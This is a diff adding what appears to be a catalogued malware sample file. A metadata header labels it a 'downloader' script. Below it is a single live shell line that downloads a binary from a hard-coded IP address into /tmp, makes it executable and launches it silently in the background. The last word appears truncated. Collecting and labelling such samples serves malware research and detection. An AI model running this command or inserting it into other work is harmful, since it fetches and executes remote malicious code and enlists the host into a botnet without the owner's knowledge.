@@ -1,0 +1,10 @@
+# sha256: b2697794f0f84fbefc40f0b92d1986a4ca36f53b0b5e29e6c2505d4ef8df98d5
+# family: downloader
+# kind: script
+# size_bytes: 100
+# first_seen: 2026-07-21 22:20:09.141292 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp; wget -q http://94.154.43.123/x86 -O bot; chmod +x bot; nohup ./bot > /dev/null 2>&1 & disow
